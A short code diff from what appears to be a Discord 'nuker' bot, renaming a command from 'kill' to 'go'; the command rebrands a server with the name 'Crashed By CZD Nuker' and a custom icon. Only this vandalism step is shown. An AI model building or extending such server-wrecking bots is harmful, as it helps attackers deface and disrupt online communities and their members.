@@ -50,7 +50,7 @@ async def createrole(ctx):
         pass
 
 @client.command()
-async def kill(ctx):    
+async def go(ctx):    
     with open('icon.PNG', 'rb') as f:
         icon = f.read()
         await ctx.guild.edit(name='Crashed By CZD Nuker', icon=icon)
